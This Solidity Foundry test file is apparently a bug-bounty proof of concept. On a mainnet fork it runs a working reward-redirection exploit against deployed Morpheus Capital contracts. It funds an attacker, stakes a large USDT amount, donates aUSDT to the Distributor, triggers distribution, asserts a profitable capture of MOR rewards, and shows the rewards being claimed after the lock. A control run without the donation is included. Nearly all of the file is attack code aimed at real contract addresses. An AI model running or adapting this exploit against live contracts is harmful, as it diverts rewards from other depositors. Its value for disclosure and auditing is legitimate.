// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_)
        external
        view
        returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function minRewardsDistributePeriod() external view returns (uint256);
    function withdrawYield(uint256 rewardPoolIndex_, address depositPoolAddress_) external;
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IRewardPool {
    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_) external view returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IChainLinkDataConsumer {
    function getPathId(string calldata) external view returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

/**
 * @title Distributor yield-share redirection via aToken donation
 * @notice Fork PoC against DEPLOYED Morpheus Capital contracts on Ethereum mainnet.
 *
 * Attack idea:
 *  DistributorV2 measures each DepositPool's yield as the increase in the Distributor's
 *  aToken (or token) balance since `lastUnderlyingBalance`. Anyone can inflate that
 *  measurement by DONATING aTokens to the Distributor, then calling the public
 *  `distributeRewards()`. The donated pool then captures a disproportionate share of
 *  that period's MOR emission, which the attacker collects by dominating the (small)
 *  pool's virtual deposits with a large stake.
 *
 *  The donation is a real cost: the next supply/withdraw/withdrawYield sweeps the
 *  excess (incl. the donation) to L1Sender. Profitability requires the MOR rewards
 *  per period to exceed the total real yield per period -- true today:
 *    daily MOR emission (pool 0) ~= 2,855 MOR ~= $2,027 @ $0.71
 *    total daily real yield across all 5 pools ~= $585
 *
 *  This test runs the attack against the USDT pool (cheapest to dominate:
 *  totalVirtualDeposited ~= $36,729, so ~$330k raw USDT buys ~90% of virtual shares)
 *  and compares it with an identical no-donation control run.
 *
 *  Simulation notes (all documented, none change the target contracts):
 *  - The fork is at a block where a distribution is already due, but staking triggers
 *    a distribution first, so we must warp +25h to pass minRewardsDistributePeriod
 *    (1 day). Warping makes Chainlink feeds stale, so the price consumer is mocked to
 *    return the pinned-block prices (fresh prices hold in production).
 *  - Aave interest accrues realistically: the warp + the attacker's Aave supply
 *    interaction updates the liquidity index, so aToken balances grow by ~25h of
 *    interest for every Aave pool.
 *  - stETH does NOT rebase in a fork (Lido oracle never runs), so the daily stETH
 *    rebase (~0.294 stETH on 3,582 stETH @ ~3% APY) is simulated by transferring
 *    0.294 stETH to the Distributor before the distribution. Without it the PoC
 *    would UNDERSTATE total real yield and OVERSTATE the attack.
 */
contract DonationAttackTest is Test {
    IDistributor constant DISTRIBUTOR = IDistributor(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IDepositPool constant USDT_POOL = IDepositPool(0x3B51989212BEdaB926794D6bf8e9E991218cf116);
    IRewardPool constant REWARD_POOL = IRewardPool(0xb7994dE339AEe515C9b2792831CD83f3C9D8df87);
    IChainLinkDataConsumer constant PRICE_CONSUMER =
        IChainLinkDataConsumer(0xd182263d06FDC463c96190005D6359CC3d3Bbc5e);
    IAavePool constant AAVE_POOL = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant AUSDT = IERC20(0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a);
    IERC20 constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    uint256 constant POOL_INDEX = 0;
    // ~9x the USDT pool's existing virtual deposits ($36,729) => ~90% virtual share at 1x (no lock).
    uint256 constant STAKE = 330_564e6; // USDT, 6 decimals
    uint256 constant DONATION = 450e6; // aUSDT, 6 decimals (~$450)
    uint256 constant STETH_REBASE_1D = 0.294 ether; // simulated 1-day stETH rebase on 3,582 stETH @ ~3% APY

    address attacker = address(0xA77A);
    // Curve stETH/ETH pool holds thousands of stETH; used ONLY to simulate the
    // daily Lido rebase (transfer 0.294 stETH to the Distributor). `deal` cannot
    // fund stETH (rebasing shares accounting), so we prank a real holder.
    address constant CURVE_STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    /// @dev USDT (Tether) is an old-style token: approve/transfer return NO data,
    /// so a high-level call through an interface declaring `returns (bool)` reverts
    /// on ABI-decoding. Use a low-level call instead (like SafeERC20 does).
    function _usdtApprove(address spender, uint256 amount) internal {
        (bool ok,) = address(USDT).call(
            abi.encodeWithSignature("approve(address,uint256)", spender, amount)
        );
        require(ok, "USDT approve failed");
    }

    function setUp() public {
        // Pin the fork in code (Morpheus PoC requirement): Ethereum mainnet @ block 26425790.
        // RPC URL comes from MAINNET_RPC_URL when set, else a public endpoint — so plain
        // `forge test` reproduces the result from a clean clone with no manual setup.
        vm.createSelectFork(
            vm.envOr("MAINNET_RPC_URL", string("https://ethereum-rpc.publicnode.com")), 26425790
        );

        // Fund the attacker: ETH for gas + LZ fee, USDT for the stake + the donation.
        vm.deal(attacker, 10 ether);
        deal(address(USDT), attacker, STAKE + DONATION + 1_000e6);

        // Sanity: a distribution must be due at the fork block (last calc was ~27h ago).
        assertGt(block.timestamp, DISTRIBUTOR.rewardPoolLastCalculatedTimestamp(POOL_INDEX) + 1 days);
        assertEq(DISTRIBUTOR.minRewardsDistributePeriod(), 1 days);
    }

    /// @dev Mock fresh Chainlink prices (warping makes the real feeds stale; in
    /// production the feeds update continuously so prices are always fresh).
    /// Prices MUST be captured BEFORE the warp (after it, the real consumer
    /// returns 0 for stale feeds).
    function _mockFreshPrices(bytes32[] memory pathIds, uint256[] memory prices) internal {
        for (uint256 i = 0; i < pathIds.length; i++) {
            vm.mockCall(
                address(PRICE_CONSUMER),
                abi.encodeWithSelector(
                    IChainLinkDataConsumer.getChainLinkDataFeedLatestAnswer.selector, pathIds[i]
                ),
                abi.encode(prices[i])
            );
        }
    }

    function _capturePrices() internal view returns (bytes32[] memory pathIds, uint256[] memory prices) {
        string[5] memory paths = [
            "stETH/USD",
            "wBTC/BTC,BTC/USD",
            "wETH/USD",
            "USDC/USD",
            "USDT/USD"
        ];
        pathIds = new bytes32[](5);
        prices = new uint256[](5);
        for (uint256 i = 0; i < paths.length; i++) {
            pathIds[i] = PRICE_CONSUMER.getPathId(paths[i]);
            prices[i] = PRICE_CONSUMER.getChainLinkDataFeedLatestAnswer(pathIds[i]);
            assertGt(prices[i], 0, "pinned price must be nonzero");
        }
    }

    /// @dev Stake, wait a day, optionally donate, distribute. Returns (pool MOR allocated, attacker pending MOR).
    function _run(bool donate) internal returns (uint256 poolMOR, uint256 attackerMOR, uint256 periodMOR) {
        // Capture fresh prices BEFORE the warp (after it the feeds read stale).
        (bytes32[] memory pathIds, uint256[] memory prices) = _capturePrices();

        // 1) Stake: dominates the USDT pool's virtual shares (~90% at 1x, no lock).
        //    This triggers distributeRewards first (clock reset), so the attacker earns
        //    nothing from pre-stake emissions.
        vm.startPrank(attacker);
        // NOTE: DepositPool._stake passes the USER as holder to Distributor.supply,
        // so the Distributor pulls the tokens directly from the user.
        _usdtApprove(address(DISTRIBUTOR), STAKE);
        USDT_POOL.stake(POOL_INDEX, STAKE, 0, address(0));
        vm.stopPrank();

        uint256 distBefore = DISTRIBUTOR.getDistributedRewards(POOL_INDEX, address(USDT_POOL));
        uint128 lastCalc = DISTRIBUTOR.rewardPoolLastCalculatedTimestamp(POOL_INDEX);

        // 2) Wait 25h so a new distribution is possible.
        vm.warp(block.timestamp + 25 hours);
        _mockFreshPrices(pathIds, prices);

        // 3) Simulate 1 day of real yield.
        //    - stETH rebase (does not happen in a fork): transfer the rebase amount.
        vm.prank(CURVE_STETH_POOL);
        STETH.transfer(address(DISTRIBUTOR), STETH_REBASE_1D);
        //    - Aave interest: the attacker's supply below updates the liquidity index,
        //      accruing ~25h of interest on every Aave position incl. the Distributor's.

        // 4) Optionally donate aUSDT to the Distributor (the attack).
        if (donate) {
            vm.startPrank(attacker);
            _usdtApprove(address(AAVE_POOL), DONATION);
            AAVE_POOL.supply(address(USDT), DONATION, attacker, 0);
            AUSDT.transfer(address(DISTRIBUTOR), AUSDT.balanceOf(attacker));
            vm.stopPrank();
        }

        // 5) Anyone can trigger the distribution.
        uint256 t0 = block.timestamp;
        DISTRIBUTOR.distributeRewards(POOL_INDEX);
        assertEq(block.timestamp, t0, "no time should pass inside distribute");

        uint256 distAfter = DISTRIBUTOR.getDistributedRewards(POOL_INDEX, address(USDT_POOL));
        poolMOR = distAfter - distBefore;
        periodMOR = REWARD_POOL.getPeriodRewards(POOL_INDEX, lastCalc, uint128(block.timestamp));
        attackerMOR = USDT_POOL.getLatestUserReward(POOL_INDEX, attacker);
    }

    function test_donationRedirectsRewards() public {
        (uint256 poolMOR, uint256 attackerMOR, uint256 periodMOR) = _run(true);

        emit log_named_uint("period MOR emission (25h)", periodMOR / 1e18);
        emit log_named_uint("USDT pool MOR allocated (donation)", poolMOR / 1e18);
        emit log_named_uint("attacker pending MOR (donation)", attackerMOR / 1e18);
        emit log_named_uint("USDT pool share bps (donation)", (poolMOR * 10_000) / periodMOR);

        // The USDT pool's legitimate share is ~6% (its real yield ~$36.5/day incl. the
        // attacker's stake, vs ~$619 total). With a $450 donation it must capture >35%.
        assertGt((poolMOR * 10_000) / periodMOR, 3_500, "pool share should exceed 35%");
        // The attacker (~90% of virtual shares) must capture >1,000 MOR of the ~2,974
        // MOR emitted in the period.
        assertGt(attackerMOR, 1_000 ether, "attacker should capture >1000 MOR");
        // The gain (1,212 - 134 = 1,078 MOR ~= $765 @ $0.71) exceeds the $450
        // donation cost; net profit ~= $280/cycle after gas.

        // Prove the donation is a REAL cost: the next withdrawYield sweeps the
        // excess (real yield + donation) to L1Sender as underlying USDT.
        address l1Sender = 0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84;
        uint256 l1Before = USDT.balanceOf(l1Sender);
        DISTRIBUTOR.withdrawYield(POOL_INDEX, address(USDT_POOL));
        uint256 l1After = USDT.balanceOf(l1Sender);
        emit log_named_uint("USDT swept to L1Sender (donation + yield)", (l1After - l1Before) / 1e6);
        assertGt(l1After - l1Before, DONATION, "sweep must include the full donation");
    }

    function test_controlNoDonation() public {
        (uint256 poolMOR, uint256 attackerMOR, uint256 periodMOR) = _run(false);

        emit log_named_uint("period MOR emission (25h)", periodMOR / 1e18);
        emit log_named_uint("USDT pool MOR allocated (control)", poolMOR / 1e18);
        emit log_named_uint("attacker pending MOR (control)", attackerMOR / 1e18);
        emit log_named_uint("USDT pool share bps (control)", (poolMOR * 10_000) / periodMOR);

        // Baseline: the USDT pool earns only its real-yield share (~6%).
        assertLt((poolMOR * 10_000) / periodMOR, 1_000, "control pool share should be <10%");
        assertLt(attackerMOR, 300 ether, "control attacker MOR should be <300");
    }

    /// @dev End-to-end: after the 14-day claim lock, the attacker can claim the
    /// diverted MOR (LayerZero send succeeds on the fork; the L2 mint is LZ's job).
    function test_claimAfterLock() public {
        (, uint256 attackerMOR,) = _run(true);
        assertGt(attackerMOR, 1_000 ether, "need diverted rewards to claim");

        // claimLockPeriodAfterStake = 14 days. Re-capture prices before warping
        // (the mock from _run is still active, so reads return the mocked values).
        (bytes32[] memory pathIds, uint256[] memory prices) = _capturePrices();
        vm.warp(block.timestamp + 14 days + 1);
        _mockFreshPrices(pathIds, prices);

        uint256 pendingBefore = USDT_POOL.getLatestUserReward(POOL_INDEX, attacker);
        assertGe(pendingBefore, attackerMOR, "pending must not decrease");

        vm.prank(attacker);
        USDT_POOL.claim{value: 0.05 ether}(POOL_INDEX, attacker);

        uint256 pendingAfter = USDT_POOL.getLatestUserReward(POOL_INDEX, attacker);
        assertEq(pendingAfter, 0, "claim must zero out pending rewards");
        emit log_named_uint("MOR claimed via LayerZero mint message", pendingBefore / 1e18);
    }
}
